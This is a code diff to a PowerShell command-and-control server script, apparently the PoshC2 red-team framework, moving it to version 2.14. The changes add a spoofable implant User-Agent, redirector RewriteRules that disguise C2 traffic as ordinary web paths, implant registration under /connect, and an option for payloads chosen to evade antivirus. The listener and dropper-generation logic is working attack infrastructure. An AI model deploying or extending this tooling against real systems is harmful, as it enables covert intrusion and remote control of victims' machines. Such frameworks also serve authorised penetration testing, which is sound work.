@@ -18,7 +18,7 @@ Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -Fore
 Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
 Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
 Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
-Write-Host "=============== v2.13 www.PoshC2.co.uk =============" -ForegroundColor Green
+Write-Host "=============== v2.14 www.PoshC2.co.uk =============" -ForegroundColor Green
 Write-Host "====================================================" `n -ForegroundColor Green
 
 if (!$RestartC2Server) {
@@ -296,6 +296,7 @@ if ($RestartC2Server)
     $apikey = $c2serverresults.APIKEY
     $mobilenumber = $c2serverresults.MobileNumber
     $urlstring = $c2serverresults.URLS
+    $useragent = $c2serverresults.UserAgent
 
     $Host.ui.RawUI.WindowTitle = "PoshC2 Server: $ipv4address Port $serverport"
 
@@ -462,9 +463,9 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
     
     $apache = @"
 RewriteEngine On
-RewriteRule ^/webapp/static(.*) $uri<IP ADDRESS>/webapp/static`$1 [NC,P]
-RewriteRule ^/connect(.*) $uri<IP ADDRESS>/connect`$1 [NC,P]
-RewriteRule ^/daisy(.*) $uri<IP ADDRESS>/daisy`$1 [NC,P]
+Define PoshC2 <ADD_IPADDRESS_HER>
+RewriteRule ^/webapp/static(.*) $uri`${PoshC2}/webapp/static`$1 [NC,P]
+RewriteRule ^/connect(.*) $uri`${PoshC2}/connect`$1 [NC,P]
 "@
     $customurldef = "No"
     $customurl = Read-Host -Prompt "[3] Do you want to customize the beacon URLs from the default? [No]"
@@ -473,7 +474,7 @@ RewriteRule ^/daisy(.*) $uri<IP ADDRESS>/daisy`$1 [NC,P]
         $urls = @()
         do {
             $input = (Read-Host "Please enter the URLs you want to use, enter blank entry to finish: images/site/content")
-            if ($input -ne '') {$urls += "`"$input`""; $apache += "`nRewriteRule ^/$input(.*) http://<IP ADDRESS>/$input`$1 [NC,P]"}
+            if ($input -ne '') {$urls += "`"$input`""; $apache += "`nRewriteRule ^/$input(.*) $uri`${PoshC2}/$input`$1 [NC,P]"}
         }
         until ($input -eq '')
         [string]$urlstring = $null
@@ -482,28 +483,38 @@ RewriteRule ^/daisy(.*) $uri<IP ADDRESS>/daisy`$1 [NC,P]
         $urlstring = '"images/static/content/","news/id=","webapp/static/","images/prints/","wordpress/site/","steam/","true/images/77/static/","holdings/office/images/"'
             $apache = @"
 RewriteEngine On
-RewriteRule ^/connect(.*) $uri<IP ADDRESS>/connect`$1 [NC,P]
-RewriteRule ^/proxy(.*) $uri<IP ADDRESS>/proxy`$1 [NC,P]
-RewriteRule ^/daisy(.*) $uri<IP ADDRESS>/daisy`$1 [NC,P]
-RewriteRule ^/images/static/content/(.*) $uri<IP ADDRESS>/images/static/content/`$1 [NC,P]
-RewriteRule ^/news/(.*) $uri<IP ADDRESS>/news/`$1 [NC,P]
-RewriteRule ^/webapp/static/(.*) $uri<IP ADDRESS>/webapp/static/`$1 [NC,P]
-RewriteRule ^/images/prints/(.*) $uri<IP ADDRESS>/images/prints/`$1 [NC,P]
-RewriteRule ^/wordpress/site/(.*) $uri<IP ADDRESS>/wordpress/site/`$1 [NC,P]
-RewriteRule ^/true/images/77/(.*) $uri<IP ADDRESS>/true/images/77/`$1 [NC,P]
-RewriteRule ^/holdings/office/images/(.*) $uri<IP ADDRESS>/holdings/office/images/`$1 [NC,P]
-RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
+Define PoshC2 <ADD_IPADDRESS_HER>
+RewriteRule ^/connect(.*) $uri`${PoshC2}/connect`$1 [NC,P]
+RewriteRule ^/images/static/content/(.*) $uri`${PoshC2}/images/static/content/`$1 [NC,P]
+RewriteRule ^/news/(.*) $uri`${PoshC2}/news/`$1 [NC,P]
+RewriteRule ^/webapp/static/(.*) $uri`${PoshC2}/webapp/static/`$1 [NC,P]
+RewriteRule ^/images/prints/(.*) $uri`${PoshC2}/images/prints/`$1 [NC,P]
+RewriteRule ^/wordpress/site/(.*) $uri`${PoshC2}/wordpress/site/`$1 [NC,P]
+RewriteRule ^/true/images/77/(.*) $uri`${PoshC2}/true/images/77/`$1 [NC,P]
+RewriteRule ^/holdings/office/images/(.*) $uri`${PoshC2}/holdings/office/images/`$1 [NC,P]
+RewriteRule ^/steam(.*) $uri`${PoshC2}/steam`$1 [NC,P]
 "@
     }
 
+    $customuseragentdef = "No"
+    $customuseragent = Read-Host -Prompt "[4] Do you want to customize the default UserAgent? [No]"
+    $customuseragent = ($customuseragentdef,$customuseragent)[[bool]$customuseragent]
+
+    if ($customuseragent -eq "Yes") {
+        $useragent = (Read-Host "Please enter the UserAgent you want to use: ")
+    } else {
+        $useragent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)"
+    }
+
+
     $global:newdir = 'PoshC2-'+(get-date -Format yyy-dd-MM-HHmm)
-    $prompt = Read-Host -Prompt "[4] Enter a new folder name for this project [$($global:newdir)]"
+    $prompt = Read-Host -Prompt "[5] Enter a new folder name for this project [$($global:newdir)]"
     $tempdir= ($global:newdir,$prompt)[[bool]$prompt]
     $RootFolder = $PoshPath.TrimEnd("PowershellC2\")
     $global:newdir = $RootFolder+"\"+$tempdir
 
     $defbeacontime = "5s"
-    $prompt = Read-Host -Prompt "[5] Enter the default beacon time of the Posh C2 Server - 30s, 5m, 1h (10% jitter is always applied) [$($defbeacontime)]"
+    $prompt = Read-Host -Prompt "[6] Enter the default beacon time of the Posh C2 Server - 30s, 5m, 1h (10% jitter is always applied) [$($defbeacontime)]"
     $defaultbeacon = ($defbeacontime,$prompt)[[bool]$prompt]
     if ($defaultbeacon.ToLower().Contains('m')) { 
         $defaultbeacon = $defaultbeacon -replace 'm', ''
@@ -524,28 +535,28 @@ RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
     
     $killdatedefault = (get-date).AddDays(14)
     $killdatedefault = (get-date -date $killdatedefault -Format "dd/MM/yyyy")
-    $prompt = Read-Host -Prompt "[6] Enter the auto Kill Date of the implants in this format dd/MM/yyyy [$($killdatedefault)]"
+    $prompt = Read-Host -Prompt "[7] Enter the auto Kill Date of the implants in this format dd/MM/yyyy [$($killdatedefault)]"
     $killdate = ($killdatedefault,$prompt)[[bool]$prompt]
     $killdate = [datetime]::ParseExact($killdate,"dd/MM/yyyy",$null)
     $killdatefm = Get-Date -Date $killdate -Format "dd/MM/yyyy"
 
-    $prompt = Read-Host -Prompt "[7] Enter the HTTP port you want to use, 80/443 is highly preferable for proxying [$($defaultserverport)]"
+    $prompt = Read-Host -Prompt "[8] Enter the HTTP port you want to use, 80/443 is highly preferable for proxying [$($defaultserverport)]"
     $serverport = ($defaultserverport,$prompt)[[bool]$prompt]
 
     $enablesound = "Yes"
-    $prompt = Read-Host -Prompt "[8] Do you want to enable sound? [$($enablesound)]"
+    $prompt = Read-Host -Prompt "[9] Do you want to enable sound? [$($enablesound)]"
     $enablesound = ($enablesound,$prompt)[[bool]$prompt]
 
     $enablesms = "No"
-    $prompt = Read-Host -Prompt "[9] Do you want to use Clockwork SMS for new payloads? [$($enablesms)]"
+    $prompt = Read-Host -Prompt "[10] Do you want to use Clockwork SMS for new payloads? [$($enablesms)]"
     $enablesms = ($enablesms,$prompt)[[bool]$prompt]
     if ($enablesms -eq "Yes") {
-        $apikey = Read-Host -Prompt "[9a] Enter Clockwork SMS API Key?"
-        $MobileNumber = Read-Host -Prompt "[9a] Enter Mobile Number to send to? [447898....]"
+        $apikey = Read-Host -Prompt "[10a] Enter Clockwork SMS API Key?"
+        $MobileNumber = Read-Host -Prompt "[10b] Enter Mobile Number to send to? [447898....]"
     }
 
     $enablepayloads = "Yes"
-    $prompt = Read-Host -Prompt "[10] Do you want all payloads or select limited payloads that shouldnt be caught by AV? [$($enablepayloads)]"
+    $prompt = Read-Host -Prompt "[11] Do you want all payloads or select limited payloads that shouldnt be caught by AV? [$($enablepayloads)]"
     $enablepayloads = ($enablepayloads,$prompt)[[bool]$prompt]
     
     $downloaduri = Get-RandomURI -Length 5
@@ -640,7 +651,8 @@ RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
         Sounds TEXT,
         APIKEY TEXT,
         MobileNumber TEXT,
-        URLS TEXT)'
+        URLS TEXT,
+        UserAgent TEXT)'
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
@@ -650,8 +662,8 @@ RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
-    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, APIKEY, MobileNumber, URLS)
-            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @APIKEY, @MobileNumber, @URLS)'
+    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, APIKEY, MobileNumber, URLS, UserAgent)
+            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @APIKEY, @MobileNumber, @URLS, @UserAgent)'
 
     Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
         DefaultSleep = $defaultbeacon
@@ -667,6 +679,7 @@ RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
         APIKEY = $apikey
         MobileNumber = $MobileNumber
         URLS = $urlstring
+        UserAgent = $useragent
     } | Out-Null
 
     $Host.ui.RawUI.WindowTitle = "PoshC2 Server: $ipv4address Port $serverport"
@@ -697,7 +710,7 @@ RewriteRule ^/steam(.*) $uri<IP ADDRESS>/steam`$1 [NC,P]
     Write-Host -Object "activities, use the following payloads:"
     
     Import-Module $PoshPath\C2-Payloads.ps1 
-    $command = createdropper -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport
+    $command = createdropper -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent
     $payload = createrawpayload -command $command
 
     if ($enablepayloads -eq "Yes") {
@@ -825,7 +838,7 @@ while ($listener.IsListening)
         }
 
     }
-    if (($request.Url -match '/daisy') -and (($request.Cookies[0]).Name -match 'SessionID'))
+    if (($request.Url -match '/connect\?d') -and (($request.Cookies[0]).Name -match 'SessionID'))
     {
         # generate randon uri
         $randomuri = Get-RandomURI -Length 15
@@ -1158,11 +1171,13 @@ $Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
 $message =[Convert]::ToBase64String($Bytes)
 
     }
-    if ((($request.Url -match '/connect') -or ($request.Url -match '/proxy')) -and (($request.Cookies[0]).Name -match 'SessionID')) 
+    if ((($request.Url -match '/connect$') -or ($request.Url -match '/connect\?p')) -and (($request.Cookies[0]).Name -match 'SessionID')) 
     {
 
-        if ($request.Url -match '/connect') {$type = "Normal"}
-        if ($request.Url -match '/proxy') {$type = "Proxy"}
+        
+        if ($request.Url -match '/connect\?p') {$type = "Proxy"} 
+        if ($request.Url -match '/connect$') {$type = "Normal"}
+
         # generate randon uri
         $randomuri = Get-RandomURI -Length 15
         $randomuriarray += $randomuri
@@ -1175,6 +1190,9 @@ $message =[Convert]::ToBase64String($Bytes)
 
         $im_domain,$im_username,$im_computername,$im_arch,$im_pid,$im_proxy = $cookieplaintext.split(";",6)
 
+        $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
+        $defaultbeacon = $c2serverresults.DefaultSleep
+
         ## add anti-ir and implant safety mechanisms here!
         #
         # if ($im_domain -ne "blorebank") { do something }
@@ -1182,7 +1200,7 @@ $message =[Convert]::ToBase64String($Bytes)
         #
         ## add anti-ir and implant safety mechanisms here!
         $im_firstseen = $(Get-Date)
-        if ($request.Url -match '/proxy') {
+        if ($request.Url -match '/connect\?p') {
             Write-Host "New Proxy host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
         } else {
             Write-Host "New host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
